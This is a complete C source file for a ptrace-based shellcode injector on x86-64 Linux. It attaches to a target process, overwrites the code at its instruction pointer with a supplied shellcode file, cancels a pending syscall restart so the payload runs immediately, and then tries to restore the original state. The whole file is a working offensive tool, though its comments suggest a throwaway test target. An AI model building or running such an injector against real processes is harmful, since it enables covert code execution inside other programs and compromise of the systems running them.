/*
 * inject_ptrace.c — ptrace-based shellcode injector
 *
 * Attaches to a running process, writes shellcode at its current RIP,
 * detaches to let it run, then attempts to restore state.
 *
 * Usage: ./inject <pid> <shellcode.bin>
 *
 * Note: the shellcode calls exit(0) at completion, which terminates
 *       the target process. Use a disposable target (e.g., `sleep 60`).
 *       The injector handles this gracefully.
 *
 * Requires: root or CAP_SYS_PTRACE
 *           /proc/sys/kernel/yama/ptrace_scope = 0 or 1
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/types.h>

typedef struct user_regs_struct regs_t;

/* ----------------------------------------------------------------
 * Helpers
 * ---------------------------------------------------------------- */
static void die(const char *msg)
{
    fprintf(stderr, "[-] %s: %s\n", msg, strerror(errno));
    exit(1);
}

static void info(const char *fmt, ...)
{
    va_list ap;
    fprintf(stderr, "[*] ");
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, "\n");
}

static void ok(const char *fmt, ...)
{
    va_list ap;
    fprintf(stderr, "[+] ");
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, "\n");
}

static void warn(const char *fmt, ...)
{
    va_list ap;
    fprintf(stderr, "[!] ");
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, "\n");
}

/* ----------------------------------------------------------------
 * File I/O
 * ---------------------------------------------------------------- */
static unsigned char *read_file(const char *path, size_t *out_size)
{
    FILE *f = fopen(path, "rb");
    if (!f) die("fopen shellcode");

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz <= 0) {
        fprintf(stderr, "[-] Empty or invalid shellcode file\n");
        exit(1);
    }

    /* Pad to 8-byte boundary for PTRACE_POKETEXT */
    size_t padded = ((size_t)sz + 7) & ~7UL;
    unsigned char *buf = calloc(padded + 8, 1);
    if (!buf) die("calloc");

    if (fread(buf, 1, (size_t)sz, f) != (size_t)sz)
        die("fread");
    fclose(f);

    *out_size = (size_t)sz;
    return buf;
}

/* ----------------------------------------------------------------
 * ptrace memory helpers
 * ---------------------------------------------------------------- */
static void ptrace_read_mem(pid_t pid, unsigned long addr,
                            unsigned char *buf, size_t n)
{
    /* Read n bytes from pid:addr via PTRACE_PEEKTEXT (8 bytes/call) */
    size_t padded = (n + 7) & ~7UL;
    for (size_t i = 0; i < padded; i += 8) {
        errno = 0;
        long word = ptrace(PTRACE_PEEKTEXT, pid,
                           (void *)(addr + i), NULL);
        if (errno)
            die("PTRACE_PEEKTEXT");
        memcpy(buf + i, &word, sizeof(word));
    }
}

static void ptrace_write_mem(pid_t pid, unsigned long addr,
                             const unsigned char *buf, size_t n)
{
    /* Write n bytes to pid:addr via PTRACE_POKETEXT (8 bytes/call).
     * n must already be padded to 8-byte boundary by caller. */
    size_t padded = (n + 7) & ~7UL;
    for (size_t i = 0; i < padded; i += 8) {
        long word;
        memcpy(&word, buf + i, sizeof(word));
        if (ptrace(PTRACE_POKETEXT, pid,
                   (void *)(addr + i), (void *)word) < 0)
            die("PTRACE_POKETEXT");
    }
}

/* ----------------------------------------------------------------
 * ptrace attach/detach wrappers
 * ---------------------------------------------------------------- */
static int do_attach(pid_t pid)
{
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0)
        return -1;

    int status;
    if (waitpid(pid, &status, 0) < 0)
        return -1;

    if (!WIFSTOPPED(status)) {
        warn("Process did not stop after attach (status=0x%x)", status);
        return -1;
    }
    return 0;
}

static void do_detach(pid_t pid)
{
    if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0)
        warn("PTRACE_DETACH: %s", strerror(errno));
}

/* ----------------------------------------------------------------
 * Main
 * ---------------------------------------------------------------- */
int main(int argc, char *argv[])
{
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <pid> <shellcode.bin>\n", argv[0]);
        fprintf(stderr, "  pid          Target process (use 'sleep 60 &')\n");
        fprintf(stderr, "  shellcode    Assembled binary from builder\n");
        return 1;
    }

    pid_t pid = (pid_t)atoi(argv[1]);
    if (pid <= 0) {
        fprintf(stderr, "[-] Invalid pid: %s\n", argv[1]);
        return 1;
    }

    /* Load shellcode */
    size_t sc_size;
    unsigned char *shellcode = read_file(argv[2], &sc_size);
    size_t sc_padded = (sc_size + 7) & ~7UL;

    info("Shellcode : %s (%zu bytes, padded to %zu)", argv[2], sc_size, sc_padded);
    info("Target PID: %d", pid);

    /* ---- Attach ---- */
    info("Attaching to pid %d ...", pid);
    if (do_attach(pid) < 0)
        die("PTRACE_ATTACH");
    info("Process stopped");

    /* ---- Save registers ---- */
    regs_t orig_regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &orig_regs) < 0)
        die("PTRACE_GETREGS");
    info("RIP = 0x%llx  RSP = 0x%llx", orig_regs.rip, orig_regs.rsp);

    /* ---- Backup original bytes at RIP ---- */
    unsigned char *backup = calloc(sc_padded + 8, 1);
    if (!backup) die("calloc backup");
    ptrace_read_mem(pid, (unsigned long)orig_regs.rip, backup, sc_padded);
    info("Backed up %zu bytes at RIP", sc_padded);

    /* ---- Write shellcode at RIP ---- */
    info("Writing shellcode at 0x%llx ...", orig_regs.rip);
    ptrace_write_mem(pid, (unsigned long)orig_regs.rip, shellcode, sc_padded);
    ok("Shellcode written");

    /* ---- RIP is already pointing at our shellcode; just detach ---- */
    /* If the target was stopped while inside a syscall (e.g. a sleeping
     * process in nanosleep), PTRACE_DETACH re-enters that syscall via
     * restart_syscall instead of resuming at user RIP. The shellcode
     * would then only run after the original syscall completes — by
     * which time this injector has already restored the original
     * bytes. Setting orig_rax = -1 aborts the pending syscall restart
     * so execution resumes at user RIP (our shellcode) immediately. */
    {
        regs_t abort_regs;
        if (ptrace(PTRACE_GETREGS, pid, NULL, &abort_regs) == 0) {
            abort_regs.orig_rax = (long)-1;
            if (ptrace(PTRACE_SETREGS, pid, NULL, &abort_regs) < 0)
                warn("PTRACE_SETREGS (restart abort): %s", strerror(errno));
        } else {
            warn("PTRACE_GETREGS (restart abort): %s", strerror(errno));
        }
    }

    info("Detaching — shellcode now running");
    do_detach(pid);

    /* ---- Wait for shellcode to complete ---- */
    int wait_secs = 4;
    info("Waiting %d seconds for shellcode to complete ...", wait_secs);
    sleep((unsigned)wait_secs);

    /* ---- Try to restore original state ---- */
    info("Attempting to restore original process state ...");

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        /* Process likely exited (shellcode called exit(0)) — expected */
        if (errno == ESRCH || errno == EPERM) {
            ok("Process exited cleanly (shellcode called exit) — expected");
            ok("Shellcode completed successfully");
        } else {
            warn("Could not reattach: %s", strerror(errno));
        }
        goto done;
    }

    int status;
    waitpid(pid, &status, 0);

    /* Restore original bytes */
    ptrace_write_mem(pid, (unsigned long)orig_regs.rip, backup, sc_padded);

    /* Restore original registers */
    if (ptrace(PTRACE_SETREGS, pid, NULL, &orig_regs) < 0)
        warn("PTRACE_SETREGS restore: %s", strerror(errno));

    do_detach(pid);
    ok("Original state restored");

done:
    free(backup);
    free(shellcode);
    ok("Done");
    return 0;
}
